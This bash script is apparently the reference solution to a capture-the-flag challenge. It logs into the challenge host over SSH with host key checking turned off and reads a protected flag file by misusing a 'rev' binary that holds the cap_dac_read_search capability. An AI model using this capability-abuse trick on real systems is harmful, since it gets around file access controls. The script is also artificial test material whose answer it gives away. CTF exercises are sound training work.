#!/bin/bash
#
# Reference solution: log in as ctf over SSH and recover the flag.
# Host, port and password come from the environment (CTF_HOST, CTF_PORT,
# CTF_PASSWORD); the deployment sets them. Needs sshpass and an ssh client.
set -uo pipefail

host="${CTF_HOST:-localhost}"
port="${CTF_PORT:-22}"
password="${CTF_PASSWORD:-CTF_PASSWORD}"

run() {
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR \
        -p "$port" "ctf@$host" "$1"
}

# rev has cap_dac_read_search; 'rev flag | rev' reads and un-reverses it.
flag=$(run "cd /home/ctf && rev flag | rev")

printf '%s\n' "$flag"
case "$flag" in
    *SSP\{*) exit 0 ;;
    *) echo "no flag recovered" >&2; exit 1 ;;
esac
